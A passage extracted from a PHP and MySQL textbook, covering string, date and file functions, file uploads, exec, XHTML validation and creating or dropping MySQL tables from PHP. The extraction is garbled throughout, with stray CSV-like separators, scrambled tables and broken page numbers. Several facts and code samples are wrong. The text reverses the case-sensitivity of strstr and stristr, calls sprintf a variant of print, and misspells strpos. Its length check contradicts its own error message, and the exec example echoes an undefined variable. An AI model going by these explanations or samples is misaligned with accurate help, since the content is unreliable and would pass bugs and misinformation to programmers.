  
 This code then produces the output shown in Figure 11-1.
  
  
 Figure 11-1. Displaying 42 in binary format
  
 The formatting string in Example 11-1 contains a placeholder that specifies where 
 to put the second parameter of 42. It begins with a percent sign (
 %
 ), which is called 
 the 
 conversion specification
 . There can be any number of conversion specifications 
 in the formatting string, but they must each have a corresponding parameter when
  
 printf 
 is called.
  
 The character after the percent sign is the type specifier. The
  type specifier
  defines 
 how the parameter is formatted for display when it’s placed in the output string, as 
 demonstrated in Example 11-2.
  
 224
  
 |
  
 Chapter 11: Practical PHP",NA
% 0 8 . 2 f,"Always 
 starts 
  
 specifier
  
 Pad to 
 eight 
 characters
  
 Display as floating 
 point 
  
 number
  
  
 Figure 11-9. The segments of a conversion specifier
  
 The conversion specification in Figure 11-9 means that you’ll print the floating-
 point number left padded with zeros to eight total spaces. There will be two digits 
 after the decimal place.
  
 Using sprintf
  
 The
  sprintf
  function works exactly the same way as
  print
 , except its output is sent to 
 a string.
  
 String Functions
  
 | 229",NA
Length,"The PHP function
  strlen
  reports how many characters are in a string. This is very 
 useful for validating that there’s data in a string and that a string isn’t larger than it 
 should be. Example 11-11 shows how to use this; Figure 11-11 shows the results.
  
 Example 11-11. Calculating the length of a string
  
 <?php 
  
 $password=""scr1"";
  
 if (strlen($password) <= 5){
  
  
  echo(""Passwords must be at least 5 characters long.""); 
  
 } 
  
 else {
  
  
  echo (""Password accepted.""); 
  
 } 
  
 ?>
  
 230
  
 |
  
 Chapter 11: Practical PHP",NA
Changing Case,"PHP provides functionality for changing the case of a string to all uppercase, all 
 lowercase, or the first letter of a word to uppercase. The commands are
  strtoupper
 , 
 strtolower
 , and
  ucwords
 , respectively. Example 11-12 uses each of them with the 
 same string.
  
 Example 11-12. Using the word case functions
  
 <?php 
  
 $username=""John Doe""; 
  
 echo(""$username in uppercase is "".strtoupper($username)."".<br />""); 
  
 echo(""$username in lowercase is "".strtolower($username)."".<br />""); 
  
 echo(""$username in first letter uppercase is "".ucwords($username)."".<br />""); ?>
  
 The code in Example 11-12 displays lowercase, uppercase, and other details:
  
 John Doe in uppercase is JOHN DOE.
  
 John Doe in lowercase is john doe.
  
 John Doe in first letter uppercase is John Doe.
  
 Numbers and other symbols are not affected.
  
 Using
  strtoupper
  returns strings with all alphabetic characters converted to upper-
 case, whereas
  strtolower
  returns a string with all alphabetic characters converted to 
 lowercase. There’s a caveat to this functionality, however: any characters with 
 accents (circumflex, grave and acute accents, tilde, umlaut, and all other accents on 
 letters) won’t be converted to lowercase.
  ucwords
  returns a string with the first 
 char-acter of each word capitalized, assuming that character is alphabetic. There’s 
 one more command that we didn’t show you in our code, but would be helpful to 
 have in your back pocket:
  ucfirst
 , which makes the first character of the string an 
 upper-case letter.
  
 String Functions
  
 | 231",NA
Checking for a String,"To detect whether a string is part of another string, use
  strstr
  (see Example 11-13). 
 This function takes two parameters: the string through which to search and the 
 string for which to search. It is not case-sensitive; if you want to use a function that 
 is case-sensitive, use
  stristr
 . Lastly, there is
  strops
 , which finds the position of every 
 first occurrence of the string you specified.
  
 Example 11-13. Detecting whether a string is contained in another string
  
 <?php 
  
 $password=""secretpassword1"";
  
 if (strstr($password,""password"")){
  
  
  echo('Passwords cannot contain the word ""password"".'); 
  
 } 
  
 else {
  
  
  echo (""Password accepted.""); 
  
 } 
  
 ?>
  
 Example 11-13 outputs the following:
  
 Passwords cannot contain the word ""password"".
  
 Sometimes it’s also useful to know the position of a string that matches another 
 string.",NA
Using String Position and Substring to Extract a Portion of a String,"We’re going to use several string functions together. Let’s take the string
  testing 
 testing Username:Michele Davis
  and retrieve only the username. Example 11-14 
 shows how several functions can be used together to search and extract a portion 
 of string.
  
 Example 11-14. Using several functions together to extract a portion of a string
  
 <?php 
  
 $test_string=""testing testing Username:Michele Davis""; 
  
 $position=strpos($test_string,""Username:"");
  
 //Add on the length of the Username: 
  
 $start=$position+strlen(""Username:"");
  
 echo ""$test_string<br />""; 
  
 echo ""$position<br />""; 
  
 echo substr($test_string,$start); 
  
 ?>
  
 232
  
 |
  
 Chapter 11: Practical PHP",NA
Date and Time Functions,"PHP uses the standard Unix-style timestamp to work with dates. This is simply the 
 number of seconds since January 1, 1970. You get the current timestamp using the 
 time
  function, shown in Example 11-15.
  
 Example 11-15. A simple echo of the timestamp
  
 <?php 
  
 $timestamp= time( ); 
  
 echo $timestamp; 
  
 ?>
  
 The results are shown in Figure 11-13.
  
 This is not exactly the most meaningful representation of the date and time. So, 
 instead, you can use the
  date
  function to translate the timestamp into a meaningful 
 string. The
  date
  function takes a timestamp and a format string, as shown in 
 Example 11-16.
  
 Date and Time Functions
  
 | 233",NA
Display Formats,"Dates and times are displayed in a variety of formats. Example 11-16 used a date 
 format string of
  m/d/y G.i:s
 . Table 11-2 shows other possible components for those 
 formats.
  
 Table 11-2. Time-formatting values
  
 Form
 at
  
 Meaning
  
  
 Example value
  
 A
  
 am or pm
  
 Am
  
 A
  
 AM or PM
  
 AM
  
 23
 4
  
 |
  
 Chapter 11: Practical PHP",NA
Arithmetic,"Adding or subtracting days and hours can be done by adding or subtracting sec-
 onds. While this may sound odd, it’s not hard. To add two days to a timestamp, add 
 2*24*60*60
  (2 days
  
  24 hours
  
  60 minutes
  
  60 seconds) to the timestamp, as 
 shown in Example 11-17.
  
 Example 11-17. Adding two days to the date
  
 <?php 
  
 $timestamp= time( ); 
  
 echo date(""m/d/y G.i:s"",$timestamp); 
  
 $seconds=2*24*60*60; 
  
 $timestamp+=$seconds; 
  
 echo ""<br />new dates
  
  is:""; 
  
 echo date(""m/d/y G.i:s"",$timestamp); 
  
 ?>
  
 Date and Time Functions
  
 | 235",NA
Validating Dates,"When you receive a user-supplied date, it’s good practice, as with any other user-
 supplied data, to check whether it’s valid. You can use the
  checkdate
  function, shown 
 in Example 11-18, to validate a date. It takes three parameters—the month, day, 
 and year—for a date to validate. If the date is valid, it returns
  TRUE
 ; otherwise, it 
 returns
  FALSE
 .
  
 Example 11-18. Validating two dates
  
 <?php 
  
 echo(""Validating: 4/31/2005<br />""); 
  
 if (checkdate(4,31,2005)) {
  
  
  echo('Date accepted.'); 
  
 } 
  
 else {
  
  
  echo ('Invalid date.'); 
  
 } 
  
 echo(""<br />""); 
  
 echo(""Validating: 5/31/2005<br />""); 
  
 if (checkdate(5,31,2005)) {
  
  
  echo('Date accepted.'); 
  
 } 
  
 else {
  
  
  echo ('Invalid date.'); 
  
 } 
  
 ?>
  
 As you can tell by our example in Figure 11-15, the 31 April 2005 date was invalid, 
 yet 31 May 2005 was valid. This can happen because of a typo or because a user 
 entered wrong information.
  
  
 Figure 11-15. Only some months have 31 days
  
 236
  
 |
  
 Chapter 11: Practical PHP",NA
Using mktime to Create a Timestamp,"It’s fairly easy to get the current time and date using
  date
 , but if you’re trying to cre-
 ate a date and all you have are the components of the date such as month, day, and 
 year, you’ll need to use the
  mktime
  function. The
  mktime
  function takes the 
 following parameters:
  
 • Hour
  
 • Minute
  
 • Second
  
 • Month
  
 • Day of the month
  
 • Year
  
 You can omit some of the parameters when calling
  mktime
 , and they’ll be filled in 
 from the current time.
  mktime
  is a timestamp, which is an integer containing the 
 number of seconds between the Unix Epoch of January 1, 1970 00:00:00 GMT and 
 the time specified. You can’t omit them out of order, though. Example 11-19 checks 
 whether the date is valid, and then creates a timestamp.
  
 Example 11-19. Creating a timestamp from the components of a date
  
 <?php 
  
 echo(""Validating: 5/31/2005<br />""); 
  
 if (checkdate(5,31,2005)) {
  
  
  echo('Date accepted: ');
  
  
  $new_date=mktime(18,05,35,5,31,2005);
  
  
  echo date(""r"",$new_date); 
  
 } 
  
 else {
  
  
  echo ('Invalid date.'); 
  
 } 
  
 ?>
  
 When run, this code produces the screen shown in Figure 11-16.
  
 Now that we’ve covered dates and times, we’re ready to head onto more exciting 
 topics. Note that the number of the year might be a two- or four-digit value, 
 between 0 to 69, mapping to 2000 to 2069 and 70 to 100 to 1970 to 2000. On 
 systems where 
 time_t
  is a 32-bit signed integer, which is most common today, the 
 valid range for the year is somewhere between 1901 and 2038. This limitation is 
 fixed since the release of PHP 5.1.0. Next, we’ll discuss working with a file directly.
  
 Date and Time Functions
  
 | 237",NA
File Manipulation,"There may be times when you don’t want to store information in a database and 
 may want to work directly with a file instead. An example is a logfile that tracks 
 when your application can’t connect to the database. It would be impossible to keep 
 this information in the database because it’s not available at exactly the time you’d 
 need to write to it. PHP provides functions for file manipulation that can perform 
 the following:
  
 • Check the existence of a file
  
 • Create a file
  
 • Append to a file
  
 • Rename a file
  
 • Delete a file
  
 We’ve already discussed the
  include
  and
  require
  functions for pulling information 
 directly into a PHP script. At this juncture, we’ll focus on working with file content.
  
  
 Since working directly with files from your PHP code can create 
 secu-rity risks, it’s a good idea to find solutions to problems that 
 don’t use files directly, if possible; for example, storing information 
 in a data-
  
 base instead of in a file. You must be very careful to not allow misus-
  
 ers of your PHP programs to either read or destroy the contents of 
  
 important files either accidentally or as part of an attack.
  
 Depending on the operating system running PHP, filenames may or may not be 
 case-sensitive. For example, Windows and Mac OS X filenames are not case 
 sensitive, while Unix filenames are. Windows NTFS filesystems and Mac OS X HFS+ 
 file-systems remember the case of files but don’t use them when matching a 
 filename.
  
 238
  
 |
  
 Chapter 11: Practical PHP",NA
Functions and Precautions,"To check for the existence of a file, use the function
  file_exists
 , which takes the name 
 of the file to check for its parameter, as shown in Example 11-20. If the file exists, it 
 returns
  TRUE
 ; otherwise, it returns
  FALSE
 .
  
 Example 11-20. The file_exists.php script checks to see whether the file is there
  
 <?php 
  
 $file_name=""file_exists.php"";
  
 if(file_exists($file_name)) {
  
  
  echo (""$file_name does exist.""); 
  
 } 
  
 else {
  
  
  echo (""$file_name does not exist.""); 
  
 } 
  
 ?>
  
 As you would expect, the file does exist:
  
 The file exists.php does exist.
  
 PHP provides several functions to tell you about various file attributes. PHP has the 
 ability to read data from, and write data to, files on your system. However, it 
 doesn’t stop there. It comes with a full-featured file-and-directory-manipulation 
 API that allows you to:
  
 • View and modify file attributes
  
 • Read and list directory contents
  
 • Alter file permissions
  
 • Retrieve file contents into a variety of native data structures
  
 • Search for files based on specific patterns
  
 All of this file manipulation through the API is robust and flexible. PHP has a lot of 
 great commands, including all the file manipulation ones.
  
 Permissions
  
 Now that you know a file exists, you may think you’re done, but you’re not. Just 
 because the file is there doesn’t mean you can read, write, or execute it. To check 
 for these attributes, use
  is_readable
  to check for read access,
  is_writable
  to check for 
 write access, and
  is_executable
  to check for the ability to execute the file. Each func-
 tion takes a filename as its parameter. Unless you know the file is in the same direc-
 tory as your script, you
  must
  specify a full path to the file in the filename. You can 
 use concatenation to put the path and filename together, as in:
  
 $file_name = $path_to_file . $file_name_only;
  
 File Manipulation
  
 | 239",NA
URL Wrappers,"Two URL protocols that PHP has built in for use with the filesystem functions 
 include
  fopen
  and
  copy
 . In addition to these two wrappers, as of PHP 4.3.0, you can 
 write your own wrappers using a PHP script and
  stream_wrapper_register
 . The 
 default wrapper is
  file://
 , used with PHP, and it is the local filesystem. If you specify 
 a relative path, which is one that doesn’t begin with
  /
 ,
  \
 ,
  \\
 , or a Windows drive let-
 ter, such as
  C://
 , the path provided applies against the current working directory. 
 Usually this is where the script resides, unless of course it’s been changed.
  
 With some functions, such as
  fopen
  and
  file_get_contents
 ,
  include_path
  can be used to 
 search for relative paths as well. Table 11-3 provides a URL wrapper sum-mary for 
 reference.
  
 Table 11-3. URL wrappers
  
 Attribute
  
  
 Supported
  
 Restricted by
  allow_url_fopen 
  
 Allows reading 
  
 Allows simultaneous reading 
 and writing Allows writing 
  
 Allows appending 
  
 Supports
  stat
  
 No 
  
 Yes 
  
 Yes 
  
 Yes 
  
 Yes 
  
 Yes
  
 242
  
 |
  
 Chapter 11: Practical 
 PHP",NA
Uploading Files,"It’s a fairly common requirement for a PHP-based site to allow file uploads. For 
 example, on a blog site, a user may want to upload an image to go with his post. 
 We’ll walk through the steps to upload a file because you’ll be designing a blog in 
 Chapter 17. PHP allows you to do this with the help of forms input.
  
 When you use the file upload form field, the client’s browser pulls up a file selection 
 dialog, so you don’t have to worry about doing that. The code to include in the file 
 upload field is
  <input type=""file"" name=""file"">
 . You must also add
  enctype= 
 ""multipart/form""
  to the
  form
  tag. This allows a file to be sent with the form submis-
 sion. Finally, because of the increased size of the form submission, you must use the 
 POST
  type submission instead of
  GET
 .
  
  
 The
  php.ini
  configuration file has a setting that globally limits the 
 size of file upload, called
  upload_max_filesize
 . The default value is 2 
 MB. This helps prevent denial-of-service attacks in which an attacker 
 uploads many huge files to slow your connection or fill up your
  
 server’s storage.
  
 Once the user selects a file from the HTML form produced by Example 11-24 and 
 clicks Submit, Apache does some of the hard work by handling the upload and plac-
 ing it into a temporary directory with a temporary filename. It’s now up to you to 
 validate the upload and move it if it passes validation.
  
 Example 11-24. Prompting to upload a file
  
 <html> 
  
 <head></head> 
  
 <body> 
  
 <form action=""<?php echo(htmlspecialchars($_SERVER['PHP_SELF']))?>""
  method=""post"" 
 enctype=""multipart/form-data""
 >
  
  
  <br /><br />
  
  
  Choose a file to upload:<br />
  
  
  <
 input type=""file"" name=""upload_file""
 >
  
  
  <br />
  
  
  <input type=""submit"" name=""submit"" value=""submit""> 
  
 </form>
  
 </body> 
  
 </html>
  
 File Manipulation
  
 | 243",NA
Calling System Calls,"A system call is used by an application to request service from the operating 
 system. System calls use machine code instructions, which causes the processor to 
 change modes. Changing the mode gets the OS to perform restricted actions; for 
 example, accessing hardware devices or determining available server space.
  
 Every OS provides a library that sits between normal programs and the rest of the 
 operating system, such as the Windows API. This library handles low-level details 
 of passing information to the kernel and switching to supervisor mode.
  
 You can use the
  exec
  function to call external functions.
  
  
 For maximum security, use
  exec
  only when PHP code doesn’t provide 
 the same functionality.
  
 For example, if you’d like to get information about how much space is available on 
 the server, execute the
  df
  command, shown in Example 11-29. However, this is 
 assuming you’re on a Unix or Mac OS X host.
  
 Example 11-29. Executing df and displaying the results
  
 <?php 
  
 exec(escapeshellcmd(""df""),$output_lines,$return_value); 
  
 echo (""Command returned a value of $return_value.""); 
  
 echo ""</pre>""; 
  
 foreach ($output_lines as $output) {
  
  
  echo ""$o""; 
  
 } 
  
 echo ""</pre>""; 
  
 ?>
  
 For our system, we get the screen in Figure 11-23.
  
  
 Use extreme caution! Remember that while linking other commands 
 in this chapter, you should avoid passing user input to
  exec
  because 
 there’s a substantial risk of misuse.
  
 It’s always a good idea to use the
  escapeshellcmd( )
  function to escape any special 
 characters when calling
  exec( )
  with any data that may be user-supplied. While the 
 example isn’t using user data, the function is included to show its use. The 
 escapeshellcmd( )
  function prevents tricking the shell into executing malicious 
 commands embedded in the user data.
  
 Calling System Calls
  
 | 249",NA
Chapter 11 Questions,"Question 11-1 
  
  
 What’s the difference between
  printf( )
  and
  sprint( )
 ?
  
 Question 11-2 
  
  
 Check that the date 1/31/2045 is 
 valid.
  
 Question 11-3 
  
  
 Display the day of the week for 1/31/2045.
  
 Question 11-4 
  
  
 Rename the file
  upload.tmp
  to
  sample.jpg
 .
  
 See the “Chapter 11” section in the Appendix for the answers to these questions.
  
 250
  
 |
  
 Chapter 11: Practical PHP",NA
CHAPTER 12,NA,NA
XHTML,"12
  
 Now that you’ve learned the foundations of using PHP and MySQL to build dynamic 
 pages, take some time to explore improvements to the HTML markup that forms 
 the basis of your web pages. You’ll learn about XHTML, what it demands, and why 
 it’s worth the extra effort to produce. Remember that in order to produce quality 
 web content from your PHP scripts, the markup must be standards-conformant. 
 Think of the XHTML output as the finished product in the process of requesting a 
 page after PHP and a database functions process. We’ll also discuss validating the 
 XHTML out-put that your scripts produce to catch any errors.
  
 XHTML stands for Extensible HyperText Markup Language. XHTML is a markup 
 language that is similar to HTML, but with a stricter syntax, based on the require-
 ments of XML. HTML was built on SGML, which is flexible but complex to pro-cess, 
 and XML stripped down SGML to make it easier to process if a bit less flexible. 
 XHTML syntax looks much like HTML syntax, using greater- and less-than signs (
 < 
 and
  >
 ) to define tags, but has much stricter requirements for how those tags are 
 deployed. XHTML documents that meet those syntactic requirements are called 
 well-formed
 , while XHTML documents that meet the syntax plus the structural rules 
 contained in the DTDs are called
  valid
 .
  
  
 Plain old HTML documents can be valid, too—they don’t have to 
 meet XML’s syntactic rules, but they do have to live up to the struc-
 tures defined in the various HTML specs.
  
 XHTML documents can be processed automatically using any standard XML library, 
 while most HTML implementations use a pretty lenient parser typically customized 
 for HTML processing. You can think of XHTML as the intersection of HTML and XML 
 in many respects, since it’s a reformulation of both of them.
  
 Probably the easiest way to demonstrate what changes is to show a document in 
 HTML and its XHTML equivalent. First, here is a valid HTML 4.0 document:
  
 251",NA
Why XHTML?,"The World Wide Web Consortium (W3C) created XHTML for a number of rea-sons, 
 including the following:
  
 • Web content is delivered to more devices than conventional computers, such as 
 Blackberries, cell phones, and other mobile devices. XML’s tighter syntax 
 removes one layer of complex processing for these devices and their support 
 infrastructure to handle.
  
 • Developers working with Dynamic HTML and other scripting technologies 
 found that HTML’s flexibility sometimes meant that the document structures 
 they needed to manipulate looked a little different than expected, sometimes 
 even different from browser to browser. XHTML’s tighter structures remove 
 these ambiguities.
  
 • As more and more document management tools added XML support, XHTML’s 
 XML compatibility made it easy to use these tools on XHTML without any 
 tweaking.
  
 • On a broad scale, XHTML encourages greater consistency among documents. 
 While XML’s stricter error checking may sound like a burden, it makes it easy 
 to spot and correct errors.
  
 • While it hasn’t found much browser support, the W3C was hoping that moving 
 to an XML foundation would let developers create custom vocabularies for mix-
 ing with the classic HTML vocabulary. The W3C’s own plans included work on 
 multimedia, graphics, and forms.
  
 • XHTML could also be mixed in to other XML vocabularies, making it easier to 
  
 reuse this widely understood vocabulary in new contexts.
  
 XML’s sudden popularity drove a rethinking of why and how HTML was used, at 
 least within standards bodies. While various browsers moved to support XML and 
 XHTML to some degree, it’s far from being a required part of the web development 
 toolkit. The W3C accepted the first version of XHTML on January 26, 2000.
  
 The beauty of XML is that it requires browsers to fail when encountering 
 incorrectly created XML. What this means is that an XHTML browser can usually 
 run more eas-ily and faster on smaller devices than on a comparable HTML 
 browser. It also encourages Web authors to produce more consistent documents. 
 While stricter error checking may sound like a burden, the recommendation for 
 browsers to post an error rather than attempt to render incorrectly formed content 
 should eliminate the problem by forcing authors to correct their mistakes.
  
  
 Old-school HTML folks may be happy to hear that the W3C restarted
  
  
 the HTML Activity (as something separate from XHTML) in March
  
 2007. For more information, see
  http://www.w3.org/html/wg/
 .
  
  
 Why XHTML?
  
 | 253",NA
XHTML and XML Namespaces,"XML is incredibly generic. It defines syntax and basic structure, but it doesn’t spec-
 ify much about questions such as what elements and attributes should be named. 
 Anyone who wants to create an XML vocabulary can do so without having to con-
 tact the W3C or another standards body. This creates a problem:
  Title
  in one con-
 text may mean something entirely different than
  Title
  in a different context. The 
 Namespaces in XML specification (which can be found at
  http://www.w3.org/TR/ 
 REC-xml-names/
 ) provides a mechanism that developers can use to identify 
 particu-lar vocabularies using Uniform Resource Identifiers (URIs).
  
 URIs are a combination of the familiar Uniform Resource Locators (URLs) and Uni-
 form Resource Names (URNs). From the perspective of XML namespaces, URIs are 
 convenient because they combine an easily used syntax with a notion of ownership. 
 The W3C owns names that start with
  http://www.w3.org/
 , so it makes sense for 
 them to use those as identifiers. In plain-vanilla XHTML without any other 
 vocabularies mixed in, the namespace is declared on the
  html
  element using the 
 XHTML attribute 
 xmlns
 . For example:
  
 <html xmlns=""
 http://www.w3.org/1999/xhtml
 "" >
  
 The namespace URI
  http://www.w3.org/1999/xhtml
  now applies to the
  html
  
 element itself and to any child elements, so long as they don’t have either their own
  
 xmlns 
 attributes or names that start with a prefix and colon.",NA
XHTML Versions,"Since its inception, the XHTML standard has been constantly evolving. There are 
 three major versions in use today:
  
 XHTML 1.0 
  
 XHTML 1.0 has the same contents as HTML 4.01, but it requires the use of XML 
 syntax.
  
 XHTML 1.1 
  
 XHTML 1.1 is a module-based reformatted version of the 1.0 release. It’s strict 
 because it uses a set of modules that are selected from a much larger set defined 
 in the Modularization of XHTML. This is a W3C recommendation that provides a 
 modularization framework, modules that have a standard set and numerous 
 definitions that need to conform to the XHTML environment. Any deprecated 
 features of HTML, such as presentational elements and framesets, have been 
 removed from this version. All browser-based presentation is controlled by Cas-
 cading Style Sheets (CSS). Additionally, 1.1 adds Ruby markup support, which is 
 needed for East Asian languages.
  
 254
  
 |
  
 Chapter 12: XHTML",NA
Document Types,"An XHTML Document Type Definition (DTD) describes in precise, computer-
 readable language the syntax or grammar that is allowed for XHTML markup. When 
 an XHTML document is created, the DTD that it conforms to is declared at the top of 
 the document. XHTML 1.0 specifies three XML document types that correspond to 
 the three HTML 4.0 DTDs: Strict, Transitional, and Frameset. XHTML 1.1 and 
 XHTML 2.0 may also be specified as DTDs.
  
 Here is an example of each DTD declaration:
  
 XHTML 1.0 Strict 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""
  
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"">
  
 XHTML 1.0 Transitional 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN""
  
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">
  
 XHTML 1.0 Frameset 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Frameset//EN""
  
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-frameset.dtd"">
  
 XHTML 1.1 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.1//EN""
  
  
  
  ""http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"">
  
 XHTML 2.0 
  
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 2.0//EN""
  
  
  
  ""http://www.w3.org/MarkUp/DTD/xhtml2.dtd"">
  
 The DTD definition is placed at the beginning of the document before the opening 
 <html>
  tag, as shown in Example 12-1.
  
 Example 12-1. A document defined as xhtml 1.0 strict
  
 <?xml version=""1.0"" encoding=""UTF-8""?> 
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"">
  
  
  <head>
  
  
  
  <title>Document Type Declaration Example</title>
  
  
  </head>
  
  
  <body>
  
  
  
  <p>The content of the page goes here.</p>
  
  
  </body> 
  
 </html>
  
 The opening line:
  
 <?xml version=""1.0"" encoding=""UTF-8""?>
  
 This isn’t strictly required unless you’re using a different character encoding than 
 UTF-8.
  
 256
  
 |
  
 Chapter 12: XHTML",NA
Validation Tools,"Validating an XHTML document’s contents means checking its markup against a 
 DTD to produce a report of markup errors. You can validate HTML, XHTML, and 
 CSS files by using the W3C’s
  validator
 . (An easy way to let anyone test your docu-
 ment is to include a link to
  http://validator.w3.org/check/
 referer
  in your document.) 
 Enter the URL of your document and click Validate. For
  http://www.krautgrrl.com
 , 
 the code in Example 12-2 shows what was returned.
  
 Example 12-2. Adding a validation link as validate.html
  
 <?xml version=""1.0"" encoding=""UTF-8""?> 
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"">
  
  
  <head>
  
  
  
  <title>Document Type Declaration Example</title>
  
  
  </head>
  
  
  <body>
  
  
  
  <p>The content of the page goes here.
  
  
  
  <a href=""http://validator.w3.org/check/referer"">Validate</a> </p>
  
  
 </body> 
  
 </html>
  
 Example 12-2 displays in a web browser, as shown in Figure 12-1.
  
  
 Figure 12-1. The page with the new Validate line
  
 Clicking on Validate causes the page to be validated, as shown in Figure 12-2.
  
 Example 12-3 introduces a couple of errors to test whether the
  validator
  will catch 
 them.
  
 Example 12-3. Adding a couple of errors to validate_error.html
  
 <?xml version=""1.0"" encoding=""UTF-8""?> 
  
 <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN""
  
  
  ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> 
  
 <html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"">
  
  
  <head>
  
  
  
  <title>Document Type Declaration Example</title>
  
  
  </head>
  
 XHTML Versions
  
 | 257",NA
Common Validation Gotchas,"The following rules are the most common pitfalls to watch out for when creating 
 your XHTML code:
  
 Not closing elements that didn’t require a closing tag in HTML4 
  
 For example, using
  <br>
  instead of the correct
  <br />
  is not compliant. While 
 <br/>
 ,
  <br />
 , and
  <br></br>
  are also acceptable for XTHML, they are not as 
 compatible with older browsers as
  <br />
 .
  
 258
  
 |
  
 Chapter 12: XHTML",NA
Generating XHTML with PHP,"Generating XHTML from your PHP code is no more difficult than creating plain old 
 HTML (see Example 12-4).
  
 Example 12-4. Creating an XHTML document from PHP
  
 <?php 
  
 //Ask the browser if it knows about the application/xthml+xml MIME type 
  
 //This is necesary because of IE 
  
 if(stristr($_SERVER[""HTTP_ACCEPT""],""application/xhtml+xml"")) {
  
  
  header('Content-Type: application/xhtml+xml; charset=utf-8'); 
  
 } 
  
 else {
  
  
  header('Content-Type: text/html; charset=utf-8'); 
  
 }
  
 //Create the document type 
  
 $doctype  = '<?xml version=""1.0"" encoding=""UTF-8""?>'; 
  
 $doctype .= '<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Strict//EN"" '; 
  
 $doctype .= '    ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd""> ';
  
 //Create the heading 
  
 $head=      '<html xmlns=""http://www.w3.org/1999/xhtml"" xml:lang=""en"" lang=""en"">'; $head    .= 
 '    <head>'; 
  
 $head    .= '        <title>Document Type Declaration Example</title>'; 
  
 $head    .= '    </head>';
  
 //Create the body text 
  
 $body     = '    <body>'; 
  
 $body    .= '         <p>The content of the page goes here.</p>'; 
  
 $body    .= '    </body>';
  
 //Create the footer text 
  
 $footer   = '</html>';
  
 //Display it all together 
  
 echo $doctype; 
  
 echo $head; 
  
 echo $body; 
  
 echo $footer; 
  
 ?>
  
 Generating XHTML with PHP
  
 | 261",NA
Chapter 12 Questions,"Question 12-1 
  
  
 What are the acceptable ways to include a break in XHTML?
  
 Question 12-2 
  
 What’s the difference between specifying the document type
  <!doctype
  doctype_ 
 url
 >
  and the MIME type using
  header( )
 ?
  
 Question 12-3 
  
  
 Why can’t a MIME type of
  application/xhtml+xml
  always be specified?
  
 Question 12-4 
  
  
 How is XHTML output different than HTML output in PHP?
  
 See the “Chapter 12” section in the Appendix for the answers to these questions.
  
 262
  
 |
  
 Chapter 12: XHTML",NA
CHAPTER 13,NA,NA
Modifying MySQL Objects and PHP Data,"13
  
 In Chapter 12 you learned about the advantages of XHTML over traditional HTML. 
 This chapter explores using all of the concepts you’ve learned together so far to 
 per-form more complicated database tasks with PHP. You’ll learn how to create and 
 modify both MySQL data and database objects from within PHP. We’ll go over 
 dynamically creating HTML hyperlinks to allow your end user to expand or modify 
 data from a database query. In fact, after you learn about sessions in the next chap-
 ter, you’ll have everything you need to create full-fledged applications.",NA
Changing Database Objects from PHP,"The SQL query string remains the common tool for giving database commands. You 
 can just as easily create and modify database objects with standard SQL that is 
 called the same way you execute queries. Sometimes you’ll want to create database 
 objects from within PHP. We’ll begin with creating a table, which is an example of 
 creating objects.",NA
Creating a Table,"We’ve previously created the
  books
  and
  authors
  tables, but we haven’t created the 
 purchases
  table. We’ll create one using the PHP shown in Example 13-1.
  
 Example 13-1. Creating a table from a PHP page in create_table.php
  
 <?php 
  
 include('db_login.php'); 
  
 require_once( 'DB.php' );
  
  
  $connection = DB::connect( ""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (!$connection) 
  
 {
  
  
  die (""Could not connect to the database: <br>"". DB::errorMessage( )); 
  
 }; 
  
 $query = 'CREATE TABLE purchases (
  
  
  
  purchase_id int(11) NOT NULL auto_increment,
  
 263",NA
Dropping a Table,"Example 13-2 drops the table you just created.
  
 Example 13-2. Dropping the purchases table in drop.php
  
 <?php 
  
 require_once('db_login.php'); 
  
 require_once('DB.php'); 
  
 $connection = DB::connect(""mysql://$db_username:$db_password@$db_host/$db_database""); if 
 (DB::isError($connection)){
  
  
  die (""Could not connect to the database: <br />"". DB::errorMessage($connection)); } 
  
 $query = ""
 DROP TABLE purchases
 ""; 
  
 $result = $connection->query($query); 
  
 if (DB::isError($result)){
  
  
  die(""Could not query the database: <br />"". $query."" "".DB::errorMessage($result)); } 
  
 echo ""Table dropped successfully!""; 
  
 $connection->disconnect( ); 
  
 ?>
  
 Example 13-2 returns the following:
  
 Table dropped successfully!
  
 That worked great, but you’re going to need the
  purchases
  table, so let’s recreate the 
 table by calling the
  create_table.php
  code in Example 13-1. Since you’re modifying 
 objects, there’s a possibility that the database won’t let you do what you ask it to 
 do, which is where errors can occur.
  
  
 Dropping tables risks data loss. Be very careful about using
  DROP
 !",NA
Errors Happen,"To make sure you handle an error properly—such as a typo in the
  CREATE
  
 statement or, in this case, trying to create a table that already exists—execute the
  
 create_table. php
  script again. This produces the error shown in Figure 13-2.
  
 Assuming that your object was created without an error, you’re going to want to 
 manipulate and add data to it from PHP. Therefore, next you’ll add data to an exist-
 ing table based on input from the user.
  
 Changing Database Objects from PHP
  
 | 265",NA
Manipulating Table Data,"Since you’ve practiced executing a few SQL commands that manipulate database 
 objects, you’re ready to work with the data in your tables. You’re going to be using 
 the same SQL commands as when you created them from the MySQL prompt, but 
 now we’re going to integrate user data within PHP.",NA
Adding Data,"Naturally, you’ll need to add rows to your tables because you’re inserting new 
